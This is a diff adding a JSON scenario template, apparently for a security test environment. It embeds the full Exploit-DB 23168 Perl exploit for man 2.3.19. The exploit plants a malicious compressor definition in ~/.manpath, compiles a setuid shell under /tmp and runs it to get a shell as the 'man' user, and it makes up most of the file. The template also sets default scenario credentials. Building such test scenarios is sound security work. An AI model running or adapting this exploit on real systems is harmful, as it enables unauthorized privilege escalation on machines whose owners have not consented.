@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_23168",
+  "category": "B2_path_hijack",
+  "attack_technique": "T1574.007",
+  "cwe": "CWE-426",
+  "description": "Linux privilege escalation: Man Utility 2.3.19 - Local Compression Program Privilege Escalation\n\nExploit source code (23168.pl):\n```\nsource: https://www.securityfocus.com/bid/8675/info\n\nA vulnerability has been reported in man that may allow an attacker to gain elevated privileges. The problem lies in man failing to carry out sufficient sanity checks before executing a user-defined compression program. As a result, it may be possible for an attacker to execute arbitrary code with user 'man' privileges.\n\n#!/usr/bin/perl\n\n# (C) 2003 Sebastian Krahmer PoC UID man exploit. Bug\n# originally reported to me by author (Huh, thats strange direction I\n# know, but I reported another hole first. :-)\n#\n# If it doesnt work, use a different manpage, one that isnt already\n# compressed (seldom used).\n\nprint \"A manpage will soon pop up. Please press 'q' then (ENTER)\\n\\n\";\n<STDIN>;\n\nmy $mp = \">$ENV{HOME}/.manpath\";\nopen(MP, $mp) or die;\nprint MP \"DEFINE compressor /tmp/compress0r\\n\";\nclose MP;\n\nopen(T, \">/tmp/compress0r.c\") or die $!;\nprint T<<EOT;\n#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\n\nint main()\n{\n  setresuid(13, 13, 13);\n  setresgid(62, 62, 62);\n  system(\"cc /tmp/boomsh.c -o /tmp/boomsh\");\n  chmod(\"/tmp/boomsh\", 06755);\n  return 0;\n}\nEOT\nclose T;\nsystem(\"cc -o /tmp/compress0r /tmp/compress0r.c\");\n\nopen(BS, \">/tmp/boomsh.c\") or die $!;\nprint BS<<_EOBS_;\n#include <stdio.h>\nint main()\n{\n  char *a[] = {\"/bin/bash\", \"--norc\", \"--noprofile\", NULL};\n\n  setresuid(13, 13, 13);\n  setresgid(62, 62, 62);\n  execve(*a, a, NULL);\n  return -1;\n}\n_EOBS_\nclose BS;\n\nif (($pid = fork()) == 0) {\n\texec(\"man\", \"yuvsplittoppm\"); # some not-already-zipped page\n\texit;\n} else {\n\twait;\n}\n\nprint \"Entering UID man shell...\\n\";\nexec(\"/tmp/boomsh\");\n```",
+  "cve": "",
+  "exploitdb_id": "23168",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_23168",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
